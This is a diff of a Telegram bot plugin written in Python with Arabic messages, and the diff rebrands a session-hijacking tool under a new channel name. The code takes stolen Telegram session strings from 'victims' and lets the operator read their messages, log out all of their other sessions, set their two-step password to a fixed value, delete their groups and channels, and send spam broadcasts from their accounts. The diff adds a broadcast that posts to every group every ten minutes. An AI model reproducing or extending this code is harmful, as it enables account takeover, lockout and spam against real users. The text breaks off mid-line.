@@ -1,26 +1,20 @@
-
+from HuRe import bot, l313l
+#By Source joker @E9N99
+from telethon import events, functions, types, Button
+from datetime import timedelta
 import asyncio
-from datetime import datetime
-
-from telethon.errors import BadRequestError, FloodWaitError, ForbiddenError
-
-from JoKeRUB import l313l
-
 from ..Config import Config
-from ..core.logger import logging
-from ..core.managers import edit_delete, edit_or_reply
-from ..helpers import reply_id, time_formatter
-from ..helpers.utils import _format
-from ..sql_helper.bot_blacklists import check_is_black_list, get_all_bl_users
-from ..sql_helper.bot_starters import del_starter_from_db, get_all_starters
-from ..sql_helper.globals import addgvar, delgvar, gvarstatus
-from . import BOTLOG, BOTLOG_CHATID
-from .botmanagers import (
-    ban_user_from_bot,
-    get_user_and_reason,
-    progress_str,
-    unban_user_from_bot,
-)
+import os, asyncio, re
+from os import system
+from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
+from telethon import TelegramClient as tg
+from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
+from telethon.sessions import StringSession as ses
+from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
+import telethon;from telethon import functions
+from telethon.tl.types import ChannelParticipantsAdmins as cpa
+
+from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
 
@@ -60,11 +54,8 @@ async def userinfo(strses):
 
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-        await X(rt())
-        return True
-    except Exception as rr:
-        return rr
+
+    await X(rt())
 
 GROUP_LIST = []
 async def delacc(strses):
@@ -84,7 +75,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
 
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('E9N99')
       return True
     except:
       return False
@@ -164,7 +155,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "jepthon"
+channel = "E9N99"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -195,7 +186,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة  إكس @SOURCEE_X
+قم بلأنضمام الى قناة تيبثون العرب @E9N99
 '''
 
 keyboard = [
@@ -220,36 +211,21 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس  إكس 🤡", "https://t.me/SOURCEE_X")
+    Button.url("سورس تيبثون العرب 🤡", "https://t.me/E9N99")
     ]
 ]
-if Config.TG_BOT_USERNAME is not None and tgbot is not None:
-    @tgbot.on(events.InlineQuery)
-    async def inline_handler(event):
-        builder = event.builder
-        result = None
-        joker = Bot_Username.replace("@", "")
-        query = event.text
-        await bot.get_me()
-        if query.startswith("هاك") and event.query.user_id == bot.uid:
-            buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
-            result = builder.article(
-                title="Aljoker 🤡",
-                description="اضغط على الزر لعرض الأوامر.",
-                text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
-                buttons=buttons
-            )
-        await event.answer([result] if result else None)
-@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
-async def repo(event):
-    if event.fwd_from:
-        return
-    lMl10l = Config.TG_BOT_USERNAME
-    if event.reply_to_msg_id:
-        await event.get_reply_message()
-    response = await bot.inline_query(lMl10l, "هاك")
-    await response[0].click(event.chat_id)
-    await event.delete()
+
+
+
+@l313l.on(
+    admin_cmd(
+       pattern="هاك$"
+    )
+)
+async def op(event):
+    HuRe = Bot_Username.replace("@","")       
+    await event.edit(f"**᯽︙ قم بالدخول لبوتك من هنا @{HuRe} \n وكتابة الامر /hack** ")
+
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
@@ -277,7 +253,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/UP_UO")
+            Button.url("المطور", "https://t.me/E9N99")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -298,12 +274,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @SOURCEE_X")
+        file.write(i + "\n\nDetails BY @E9N99")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس  إكس ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس تيبثون العرب ❤️. \n/hack", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -316,7 +292,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس  إكس ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس تيبثون العرب ❤️.\n/hack", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -344,7 +320,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس  إكس", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس تيبثون العرب", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -390,7 +366,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك  إكس.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك تيبثون العرب.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -419,10 +395,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      if i == True:
-              await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك  إكس.", buttons=keyboard)
-      else:
-          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @rd0r0\n{i}")
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك تيبثون العرب.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -512,7 +485,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/SOURCEE_X")
+        Button.url("القناة", "https://t.me/E9N99")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
@@ -560,4 +533,31 @@ async def gcasta(strses, msg):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    pass
+      await x.send_message("الان ارسل لي الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
+      msg = await x.get_response()
+      await x.send_message("الان سيتم ارسال رسالة بشكل تلقائي كل 10 دقائق ")
+      i = await gcasta(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} all 😉😉.", buttons=keyboard)
+
+molb = True
+
+async def gcastb(strses, msg):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for sweetie in X.iter_dialogs():
+                if sweetie.is_group:
+                    chat = sweetie.id
+                    try:
+                        if chat != -1001606996743:
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.s
